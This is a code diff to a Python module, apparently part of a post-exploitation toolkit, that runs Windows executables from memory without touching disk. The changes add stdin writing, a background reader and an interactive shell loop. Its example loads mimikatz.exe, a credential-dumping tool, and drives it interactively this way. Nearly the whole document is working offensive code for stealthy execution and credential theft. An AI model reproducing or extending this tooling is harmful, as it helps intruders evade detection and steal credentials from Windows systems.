@@ -21,13 +21,20 @@ import ctypes
 from ctypes.wintypes import DWORD
 import traceback
 import time
+import threading
 
 WAIT_TIMEOUT=0x00000102
 
-def ReadFile(handle, desired_bytes, ol = None):
+def WriteFile(handle, data):
+	c_writen = DWORD()
+	buffer = ctypes.create_string_buffer(data)
+	if not ctypes.windll.kernel32.WriteFile(handle, buffer, len(data), ctypes.byref(c_writen), None):
+		raise ctypes.WinError()
+
+def ReadFile(handle, max_bytes):
 	c_read = DWORD()
-	buffer = ctypes.create_string_buffer(desired_bytes+1)
-	success = ctypes.windll.kernel32.ReadFile(handle, buffer, desired_bytes, ctypes.byref(c_read), ol)
+	buffer = ctypes.create_string_buffer(max_bytes+1)
+	success = ctypes.windll.kernel32.ReadFile(handle, buffer, max_bytes, ctypes.byref(c_read), None)
 	if not success:
 		last_error=ctypes.windll.kernel32.GetLastError()
 		if last_error==0x6D:#ERROR_BROKEN_PIPE
@@ -48,8 +55,11 @@ class MemoryPE(object):
 		self.hidden=hidden
 		self.hProcess=None
 		self.rpStdout=None
+		self.EOF=threading.Event()
+
 	def close(self):
 		#Killing the program if he is still alive
+		ctypes.windll.kernel32.CloseHandle(self.rpStdout)
 		ctypes.windll.kernel32.TerminateProcess(self.hProcess, 1);
 		ctypes.windll.kernel32.CloseHandle(self.hProcess)
 
@@ -74,13 +84,41 @@ class MemoryPE(object):
 			return ""
 		#Closing the write handle to avoid lock:
 		ctypes.windll.kernel32.CloseHandle(self.rpStdout)
+
 		fulldata=b""
 		while True:
 			data=ReadFile(self.pStdout, 2048)
 			if not data:
+				self.EOF.set()
 				break
 			fulldata+=data
 		return fulldata
+
+	def write_stdin(self, data):
+		WriteFile(self.pStdin, data)
+
+	def get_shell(self):
+		t=threading.Thread(target=self.loop_read)
+		t.daemon=True
+		t.start()
+		try:
+			while True:
+				data=raw_input()
+				self.write_stdin(data+"\n")
+				if data=="exit":
+					break
+				if self.EOF.is_set():
+					break
+		finally:
+			self.close()
+
+	def loop_read(self):
+		while True:
+			data=ReadFile(self.pStdout, 2048)
+			sys.stdout.write(data)
+			sys.stdout.flush()
+			if not data:
+				break
 
 	def run(self):
 		hProcess, pStdin, pStdout, rpStdin, rpStdout =  pupymemexec.run_pe_from_memory(self.cmdline, self.raw_pe, self.redirect_stdio, self.hidden)
@@ -96,7 +134,7 @@ if __name__=="__main__":
 	with open("mimikatz.exe",'rb') as f:
 		mpe=MemoryPE(f.read())
 		mpe.run()
-		mpe.wait(5)
-		mpe.close()
-		print mpe.get_stdout()
-	raw_input()
+		mpe.get_shell()
+		#mpe.wait(5)
+		#mpe.close()
+		#print mpe.get_stdout()
